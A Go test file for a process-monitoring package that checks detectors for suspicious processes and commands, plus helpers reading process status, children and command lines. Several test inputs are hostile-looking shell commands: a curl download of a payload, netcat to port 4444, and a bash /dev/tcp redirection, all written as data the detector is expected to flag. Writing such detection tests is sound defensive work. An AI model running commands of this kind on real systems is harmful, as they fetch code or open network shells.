package monitor

import (
	"os"
	"os/exec"
	"strconv"
	"strings"
	"testing"
	"time"
)

func TestIsSuspiciousProcess(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name        string
		processName string
		command     string
		want        bool
	}{
		{
			name:        "suspicious process name",
			processName: "bash",
			command:     "bash",
			want:        true,
		},
		{
			name:        "suspicious command pattern",
			processName: "python3",
			command:     "python3 -c 'print(1)'",
			want:        true,
		},
		{
			name:        "safe process",
			processName: "python3",
			command:     "python3 script.py",
			want:        false,
		},
		{
			name:        "empty input",
			processName: "",
			command:     "",
			want:        false,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got := IsSuspiciousProcess(tt.processName, tt.command)
			if got != tt.want {
				t.Fatalf("IsSuspiciousProcess(%q, %q) = %v, want %v", tt.processName, tt.command, got, tt.want)
			}
		})
	}
}

func TestIsSuspiciousCommand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{
			name:    "bash command execution",
			command: "/bin/bash -c 'id'",
			want:    true,
		},
		{
			name:    "python command execution",
			command: "python3 -c 'import os'",
			want:    true,
		},
		{
			name:    "download command",
			command: "curl https://example.test/payload.py",
			want:    true,
		},
		{
			name:    "netcat command",
			command: "nc 127.0.0.1 4444",
			want:    true,
		},
		{
			name:    "tcp redirection",
			command: "bash -c 'cat </dev/tcp/127.0.0.1/80'",
			want:    true,
		},
		{
			name:    "safe command",
			command: "python3 script.py",
			want:    false,
		},
		{
			name:    "malformed command",
			command: "\x00\x00",
			want:    false,
		},
		{
			name:    "empty command",
			command: "",
			want:    false,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			got := IsSuspiciousCommand(tt.command)
			if got != tt.want {
				t.Fatalf("IsSuspiciousCommand(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestReadStatusCurrentProcess(t *testing.T) {
	t.Parallel()

	got := ReadStatus(os.Getpid())
	for _, key := range []string{"State", "Threads", "VmRSS"} {
		value := got[key]
		if value == "" {
			t.Fatalf("ReadStatus(os.Getpid()) missing %q in %#v", key, got)
		}
	}
}

func TestReadStatusMissingProcessReturnsEmptyMap(t *testing.T) {
	t.Parallel()

	got := ReadStatus(missingPID())
	if len(got) != 0 {
		t.Fatalf("ReadStatus(missingPID) = %#v, want empty map", got)
	}
}

func TestReadChildrenIncludesSpawnedChild(t *testing.T) {
	cmd := exec.Command("sleep", "2")
	if err := cmd.Start(); err != nil {
		t.Fatalf("start child process: %v", err)
	}
	t.Cleanup(func() {
		_ = cmd.Process.Kill()
		_ = cmd.Wait()
	})

	wantPID := strconv.Itoa(cmd.Process.Pid)
	deadline := time.Now().Add(500 * time.Millisecond)
	for {
		got := ReadChildren(os.Getpid())
		if contains(got, wantPID) {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("ReadChildren(os.Getpid()) = %#v, want child PID %s", got, wantPID)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func TestReadChildrenMissingProcessReturnsEmptySlice(t *testing.T) {
	t.Parallel()

	got := ReadChildren(missingPID())
	if len(got) != 0 {
		t.Fatalf("ReadChildren(missingPID) = %#v, want empty slice", got)
	}
}

func TestReadProcessFiles(t *testing.T) {
	t.Parallel()

	pid := strconv.Itoa(os.Getpid())
	name := ReadProcessName(pid)
	if name == "" {
		t.Fatal("ReadProcessName(os.Getpid()) returned empty string")
	}

	command := ReadProcessCommand(pid)
	if command == "" {
		t.Fatal("ReadProcessCommand(os.Getpid()) returned empty string")
	}
	if strings.Contains(command, "\x00") {
		t.Fatalf("ReadProcessCommand(os.Getpid()) contains raw null separators: %q", command)
	}
}

func TestMissingProcessFilesReturnEmptyStrings(t *testing.T) {
	t.Parallel()

	pid := strconv.Itoa(missingPID())
	if got := ReadProcessName(pid); got != "" {
		t.Fatalf("ReadProcessName(missingPID) = %q, want empty string", got)
	}
	if got := ReadProcessCommand(pid); got != "" {
		t.Fatalf("ReadProcessCommand(missingPID) = %q, want empty string", got)
	}
}

func TestReadChildrenDetailsForMissingProcessReturnsEmptySlice(t *testing.T) {
	t.Parallel()

	got := ReadChildrenDetails(missingPID())
	if len(got) != 0 {
		t.Fatalf("ReadChildrenDetails(missingPID) = %#v, want empty slice", got)
	}
}

func missingPID() int {
	return 999999999
}

func contains(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}
